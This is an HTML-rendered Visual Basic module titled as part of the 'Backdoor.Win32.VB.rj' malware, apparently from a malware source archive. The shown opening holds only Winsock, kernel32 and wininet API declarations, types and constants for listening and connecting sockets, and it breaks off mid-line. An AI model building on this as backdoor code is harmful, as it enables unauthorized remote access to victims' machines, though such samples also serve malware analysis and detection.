<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Backdoor.Win32.VB.rj - Module1.bas.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Module1"</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAStartup</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wVR</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpWSAD</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WSADATAType</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSACleanup</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAIsBlocking</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSACancelBlockingCall</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WSADescription_Len</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WSASYS_Status_Len</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">WSADATAType</span><span class="sc0">
  </span><span class="sc7">wversion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">wHighVersion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">szDescription</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">WSADescription_Len</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
  </span><span class="sc7">szSystemStatus</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">WSASYS_Status_Len</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
  </span><span class="sc7">iMaxSockets</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">iMaxUdpDg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">lpszVendorInfo</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">gethostname</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostname$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">HostLen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">gethostbyname</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostname$</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">HostEnt</span><span class="sc0">
  </span><span class="sc7">h_name</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">h_aliases</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">h_addrtype</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">h_length</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">h_addr_list</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">inet_addr</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cp</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;HFFFF</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">INADDR_ANY</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H0</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">hostent_size</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">sockaddr_size</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SOCK_STREAM</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">AF_INET</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">IPPROTO_TCP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">setsockopt</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">level</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">optname</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">optval</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">optlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">getsockopt</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">level</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">optname</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">optval</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">optlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SOL_SOCKET</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;HFFFF</span><span class="sc6">&amp;</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SO_LINGER</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H80</span><span class="sc6">&amp;</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">LingerType</span><span class="sc0">
  </span><span class="sc7">l_onoff</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">l_linger</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">accept</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">addrlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">htonl</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostlong</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">htons</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostshort</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">socket</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">af</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s_type</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">protocol</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">connect</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">namelen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">send</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buf</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">buflen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">flags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">recv</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buf</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">buflen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">flags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">bind</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">namelen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">listen</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">backlog</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc0">
  </span><span class="sc7">sin_family</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">sin_port</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">sin_addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">sin_zero</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAAsyncSelect</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lEvent</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1</span><span class="sc6">&amp;</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">FD_CONNECT</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H10</span><span class="sc6">&amp;</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H20</span><span class="sc6">&amp;</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">FD_ACCEPT</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H8</span><span class="sc6">&amp;</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">InternetGetConnectedState</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wininet.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByRef</span><span class="sc0"> </span><span class="sc7">IpdwFlags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwReserved</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwMilliseconds</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"RtlMoveMemory"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Dest</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Src</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cb&amp;</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CallWindowProc</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"CallWindowProcA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpPrevWndFunc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Msg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span 